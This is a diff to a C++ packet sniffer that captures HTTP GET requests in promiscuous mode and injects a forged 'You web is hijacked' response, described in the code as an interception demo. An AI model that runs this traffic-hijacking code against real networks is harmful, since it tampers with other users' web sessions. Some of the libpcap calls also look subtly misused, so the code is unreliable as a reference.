@@ -12,12 +12,12 @@
 #include <sys/ioctl.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
 
-#ifdef _ENABLE_PCAP
-#include <pcap.h>
-#endif
 
-#define BUF_LEN (2048)
+#define BUF_LEN         (2048)
+#define CHECK_PATH_LEN  (15)
 
 #ifndef ETHERTYPE_VLAN
 #define ETHERTYPE_VLAN 0x8100
@@ -28,9 +28,17 @@
 
 // 劫持响应
 static char *g_Response = "<html>"
-                          "<head><title>拦截测试</title></head>"
+                          "<head><title>intercept demo</title></head>"
                           "<body><h1>You web is hijacked, Haha</h1></body>"
                           "</html>";
+
+volatile sig_atomic_t keepRunning = 1;
+
+void sig_handler(int sig) {
+    if (sig == SIGINT) {
+        keepRunning = 0;
+    }
+}
 
 ///
 PacketSniffer::PacketSniffer() {
@@ -64,11 +72,11 @@ void PacketSniffer::Start(char *eth, int type) {
 
   // 采集类型
   if (type == 1) {
-    printf("Enable raw socket\n");
+    printf("In raw socket mode\n");
 
     this->RawSniffer(eth);
   } else if (type == 2) {
-    printf("Enable libpcap\n");
+    printf("In libpcap mode\n");
 
     this->PcapSniffer(eth);
   }
@@ -126,7 +134,7 @@ void PacketSniffer::HandleFrame(char *pdata) {
     return;
   }
 
-  Data = (char *)tcp + sizeof(struct tcphdr);
+  Data = (char *)tcp + tcp->doff * 4;
 
   /// GET请求
   if (ntohl(*(unsigned int *)Data) != VALUE_GET) {
@@ -138,18 +146,16 @@ void PacketSniffer::HandleFrame(char *pdata) {
     return;
   }
 
-  /// 便于演示，只拦截指定IP且主域名为*.htm的请求
-  printf("IP:%u %s/%s plen:%d\n", iphead->saddr, host.host, host.path,
-         host.plen);
+  printf("IP: %x %s/%s plen:%d\n", iphead->saddr, host.host, host.path, host.plen);
 
-  /// 仅拦截path长度为20的请求
-  if (host.plen >= 20) {
+  /// 便于演示，仅拦截path>15的请求
+  if (host.plen >= CHECK_PATH_LEN) {
     // 伪造响应
     mFaker->sendHttpResponse((char *)iphead, g_Response);
   }
 }
 
-void PacketSniffer::RawSniffer(const char *ethn) {
+int PacketSniffer::RawSniffer(const char *ethn) {
   int n;
   char buffer[BUF_LEN];
 
@@ -165,36 +171,81 @@ void PacketSniffer::RawSniffer(const char *ethn) {
   ifr.ifr_flags |= IFF_PROMISC;
   ioctl(sock, SIOCGIFFLAGS, &ifr);
 
-  while (1) {
+  // 设置非阻塞模式
+  int flags = fcntl(sock, F_GETFL, 0);
+  fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
+  while (keepRunning) {
     bzero(buffer, BUF_LEN);
     n = recvfrom(sock, buffer, BUF_LEN, 0, NULL, NULL);
 
-    // 回调处理
-    this->HandleFrame(buffer);
+    if (n > 0) {
+      // 回调处理
+      this->HandleFrame(buffer);
+    } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
+      // 无数据时短暂休眠
+      usleep(1000);
+    }
   }
 
   close(sock);
+  return 0;
 }
 
 #ifdef _ENABLE_PCAP
+#include <pcap.h>
 
 // Libpcap回调函数
-void GetPacket(u_char *arg, const struct pcap_pkthdr *, const u_char *packet) {
+void GetPacket(u_char *arg, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
   PacketSniffer *pSniffer = (PacketSniffer *)arg;
-  pSniffer->HandleFrame((char *)packet);
+  
+  // 仅处理有效长度的包
+  if (pkthdr->caplen > 0) {
+    pSniffer->HandleFrame((char *)packet);
+  }
 }
 
 #endif // _ENABLE_PCAP
 
-void PacketSniffer::PcapSniffer(char *eth) {
+int PacketSniffer::PcapSniffer(char *eth) {
 #ifdef _ENABLE_PCAP
-  char errBuf[1024];
-  pcap_t *device = pcap_open_live(eth, 65535, 1, 0, errBuf);
-  if (!device) {
+  printf("pcap sniffer ...\n");
+  char errBuf[PCAP_ERRBUF_SIZE];
+  pcap_t *handle;
+  const char *device = pcap_lookupdev(errBuf);
+  if (device == NULL) {
+      fprintf(stderr, "Couldn't find default device: %s\n", errBuf);
+      return 1;
+  }
+
+  handle = pcap_open_live(eth, BUFSIZ, 1, 1000, errBuf);
+  if (!handle) {
     printf("ERROR: open pcap %s\n", errBuf);
     exit(1);
   }
 
-  pcap_loop(device, -1, GetPacket, (u_char *)this);
+  // 设置缓冲区大小为2MB
+  if (pcap_set_buffer_size(handle, 2 * 1024 * 1024) != 0) {
+    printf("WARNING: Failed to set pcap buffer size\n");
+  }
+
+  // 设置非阻塞模式
+  if (pcap_setnonblock(handle, 1, errBuf) != 0) {
+    printf("WARNING: Failed to set pcap non-blocking mode\n");
+  }
+ 
+  while (keepRunning) {
+    int count = pcap_dispatch(handle, 10, GetPacket, (u_char *)this);
+    if (count < 0) {
+      fprintf(stderr, "Error capturing packets: %s\n", pcap_geterr(handle));
+      break;
+    } else if (count == 0) {
+      usleep(10000);
+    }
+  }
+
+  pcap_close(handle);
 #endif // _ENABLE_PCAP
+
+  return 0;
 }
